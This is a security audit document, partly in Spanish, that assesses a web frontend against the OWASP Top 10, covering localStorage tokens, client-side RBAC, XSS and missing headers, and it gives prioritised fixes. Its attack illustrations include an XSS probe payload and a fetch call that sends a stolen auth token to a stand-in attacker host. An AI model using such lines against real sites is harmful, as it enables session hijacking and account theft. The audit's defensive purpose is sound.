# 🔐 07_SECURITY.md

## OWASP Top 10 Analysis

### A01 — BROKEN ACCESS CONTROL 🔴 **CRITICAL**

**Status**: ⚠️ **Parcialmente implementado, riesgos presentes**

#### Auth Check (main.js)

```javascript
checkAuth() {
  const token = localStorage.getItem('authToken')
  const user = localStorage.getItem('currentUser')
  
  if (!token || !user) {
    window.location.href = '/login.html'
    return false
  }
  return true
}
```

**Vulnerabilidades**:
1. ❌ localStorage readable desde DevTools + XSS
2. ❌ Token sin expiración checkeada (solo almacenado)
3. ❌ No hay refresh token logic
4. ❌ Si token expira, error silencioso (user desconectado sin aviso)

#### Role-Based Access Control (RBAC)

Detectado en `main.js`:

```javascript
manageAdminMenu() {
  const userRole = /* from localStorage */
  // Show/hide menu items según rol
}
```

**Riesgos**:
1. ❌ RBAC es **client-side only** (facilmente bypassable)
2. ⚠️ Backend debe validar permisos (se asume pero no verificado)
3. ❌ No hay ABAC (attribute-based) — solo roles simples

#### IDOR (Insecure Direct Object References)

**Ejemplo riesgoso**:
```javascript
usuarioService.getById(userId)  // userId viene de URL/input
```

**Riesgos**:
- ✅ Si backend valida ownership, está ok
- ❌ Si backend no valida, usuario A puede ver datos de usuario B

**No hay evidencia de validación en frontend.**

---

### A02 — CRYPTOGRAPHIC FAILURES 🔴 **CRITICAL**

#### Token Storage

**Current**: JWT en localStorage (PLAINTEXT)

```javascript
localStorage.setItem('authToken', jwtToken)
```

**Vulnerabilidades**:
1. ⚠️ localStorage es accesible a cualquier script en la página
2. 🔴 Si hay XSS, attacker roba token
3. 🔴 Token visible en DevTools
4. 🔴 Sin HttpOnly flag (localStorage no soporta)

**Alternativas**:
- ✅ Cookie HttpOnly + Secure (mejor, pero requiere backend change)
- ⚠️ Memory-only + refresh token (complejo)
- 🔴 Current approach es conveniente pero inseguro

#### HTTPS

**Current**: 
- 🟢 Production en Railway (HTTPS forzado)
- 🔴 Desarrollo local sin HTTPS (but ok para dev)

---

### A03 — INJECTION 🟡 **MEDIUM**

#### SQL Injection

**Frontend**: No ejecuta SQL (no applicable aquí)

**Backend responsable**: Se asume usa parameterized queries (no verificado)

#### XSS (Cross-Site Scripting)

**Frontend rendering**:

```javascript
this.mainContent.innerHTML = `<div>${userData.nombre}</div>`
```

**Riesgos**:
- ❌ Si userData.nombre = `<img src=x onerror=alert('xss')>`, ejecuta
- ✅ Backend probablemente valida/sanitiza (se asume)
- ❌ No hay DOMPurify o librería equivalente en frontend

**Mitigation**:
- ✅ CSP headers (esperar backend las envíe)
- ❌ No hay sanitization en frontend
- ✅ Fetch API protege contra algunos tipos (no inline scripts)

#### Command Injection

**No aplica** — Frontend no ejecuta comandos del SO.

---

### A04 — INSECURE DESIGN 🟡 **MEDIUM**

#### Rate Limiting

**Frontend**: ❌ No implementado
- Usuarios pueden clickear botones múltiples veces
- Múltiples requests sin freno

**Backend**: Presumiblemente tiene rate limiting (no verificado)

#### Account Enumeration

**Login page**:
```html
<input type="email" id="email" placeholder="Correo">
```

**Risk**: Si backend retorna "user exists", attacker puede enumerar usuarios.

#### Brute Force Protection

**Frontend**: ❌ No hay progressive delays
- Nada detiene ataques de fuerza bruta (130 tries/segundo posible)

**Backend**: Presumiblemente tiene lockout (no verificado)

#### Password Reset

**Aparenta estar en login.js** (no leído completo)

**Riesgos típicos**:
- ❌ Reset token sin expiración
- ❌ Reset token predecible
- ❌ Token reutilizable múltiples veces

---

### A05 — SECURITY MISCONFIGURATION 🟡 **MEDIUM**

#### Helmet Headers

**Current**: ❌ **No hay backend security headers configuradas**

```javascript
// Debería tener en backend (no visto):
// X-Content-Type-Options: nosniff
// X-Frame-Options: DENY
// X-XSS-Protection: 1; mode=block
// Strict-Transport-Security: ...
```

#### CORS

**Vite config proxy** (vite.config.js):
```javascript
proxy: {
  '/api': {
    target: proxyTargetFromEnv(env),
    changeOrigin: true,
    ...
  }
}
```

**Riesgos**:
- ✅ En desarrollo, proxy evita CORS (ok)
- ⚠️ En producción, CORS debe estar configurado en backend
- ❌ Si backend no tiene CORS, requests fallan silenciosamente

#### Error Handling

**Frontend**:
```javascript
if (!response.ok) {
  throw new Error(`HTTP ${response.status}`)
}
```

**Riesgos**:
- ⚠️ Error messages pueden ser verbose (stack traces)
- ✅ No parece loguear datos sensibles

---

### A06 — VULNERABLE DEPENDENCIES 🟡 **MEDIUM**

**Ejecutar**:
```bash
npm audit
```

**Packages con riesgo potencial**:
- ⚠️ Axios 1.6.7 (publicado 2023, posible CVE)
- ⚠️ jsPDF 2.5.1 (revisar CVEs)

**NO ejecutado audit** durante auditoría (requiere `npm audit` en terminal).

---

### A07 — AUTHENTICATION FAILURES 🔴 **CRITICAL**

#### JWT Implementation

**Current**:
- ✅ Token Bearer en Authorization header (correcto)
- ❌ Sin expiración checkeada en frontend
- ❌ Sin refresh token
- ❌ Token permanente hasta manual logout

#### 2FA / MFA

**Status**: ❌ **No implementado**

#### Session Timeout

**Status**: ❌ **No hay inactividad timeout**
- Usuario puede estar logueado eternamente
- Vulnerable en shared computers

#### Logout

**Presumible en app**:
```javascript
localStorage.removeItem('authToken')
localStorage.removeItem('currentUser')
window.location.href = '/login.html'
```

**Riesgos**:
- ⚠️ Backend no está notificado del logout (token sigue siendo válido)
- ✅ Token en blacklist (probablemente no implementado)

---

### A08 — SOFTWARE AND DATA INTEGRITY FAILURES 🟡 **MEDIUM**

#### Input Validation

**Frontend validators** (utils/cedulaValidator.js, etc.):

```javascript
// Ejemplo (no leído completo)
if (!cedula || cedula.length !== 10) {
  return false
}
```

**Riesgos**:
- ✅ Frontend valida formato (UX mejora)
- ❌ **Backend MUST validar** (se asume pero no verificado)
- ❌ No hay server-side validation documentada

#### Signed URLs

**Para file uploads** (Cloudinary):
- Probablemente usa signed URLs (verificar en cloudinaryService.js)

---

### A09 — LOGGING & MONITORING FAILURES 🟡 **MEDIUM**

#### Audit Logging

**Auditoria page** (pages/auditoria.js):
- Consume endpoint `/api/auditoria`
- Muestra cambios de usuarios

**Riesgos**:
- ✅ Backend loguea cambios (probablemente)
- ⚠️ Logs no son immutable (modificables en DB)
- ❌ No hay blockchain o WORM storage

#### Sensitive Data Logging

**Risk**: 
- ❌ Contraseñas podría ser logueadas en error logs
- ❌ Tokens podrían estar en logs de requests

**No hay evidencia de sanitización de logs.**

---

### A10 — SERVER-SIDE REQUEST FORGERY (SSRF) 🟢 **LOW**

**Status**: ✅ **Bajo riesgo para frontend**

Frontend no hace requests a URLs arbitrarias:
- Solo a `VITE_API_BASE_URL` (configurado)
- No hay endpoint para "download from URL" (probable)

---

## Additional Security Issues

### localStorage Exposure

**Criticidad**: 🔴 **CRITICAL**

```javascript
const token = localStorage.getItem('authToken')
```

**XSS attack scenario**:
```javascript
// Attacker-injected script
fetch('https://attacker.com/steal?token=' + localStorage.getItem('authToken'))
```

**Mitigations**:
1. ❌ Implementar Content Security Policy (CSP)
2. ❌ Usar SameSite cookies en lugar de localStorage
3. ✅ Sanitizar inputs (no evita localStorage theft pero reduce XSS surface)

### Missing CSP Headers

**Recomendación**:
```
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self'; 
  style-src 'self' 'unsafe-inline';
  font-src 'self';
```

Backend debe enviar estos headers.

### API Endpoint Exposure

**Riesgo**: pdfendpointsdelbackend.pdf en el repo

```
❌ Este PDF está commiteado y contiene rutas de API
```

**Action**: Borrar de repo o al menos de .gitignore futuro.

---

## Security Checklist

| Item | Status | Priority |
|------|--------|----------|
| JWT sin expiración | ❌ | P0 |
| localStorage token | ❌ | P0 |
| RBAC client-side only | ❌ | P0 |
| No input sanitization | ❌ | P0 |
| Sin rate limiting | ❌ | P1 |
| Sin 2FA | ❌ | P1 |
| No CSP headers | ❌ | P1 |
| Sensible data en logs | ⚠️ | P2 |

---

## Recommended Fixes (Priority Order)

### P0 — CRITICAL (Fix immediately)

1. **Token Management**:
   - [ ] Implementar JWT expiración checkeada
   - [ ] Agregar refresh token endpoint
   - [ ] Usar secure HttpOnly cookies (requiere backend change)

2. **Input Validation**:
   - [ ] Installar DOMPurify
   - [ ] Sanitizar todos los inputs dinámicos
   - [ ] Validación server-side (backend)

3. **RBAC**:
   - [ ] Server-side authorization checks
   - [ ] Remover lógica de ocultamiento de UI como security

### P1 — HIGH

4. [ ] CSP headers en backend
5. [ ] Rate limiting en backend
6. [ ] Session timeout after inactivity
7. [ ] CORS headers correctos

### P2 — MEDIUM

8. [ ] 2FA / MFA
9. [ ] Audit log immutability
10. [ ] Sentry error tracking

---

## 🔗 ARCHIVOS CLAVE

- [src/services/authService.js](../src/services/authService.js) — Auth logic
- [src/login.js](../src/login.js) — Login/register logic
- [src/utils/errorHandler.js](../src/utils/errorHandler.js) — Error handling
- [src/config/api.js](../src/config/api.js) — API config
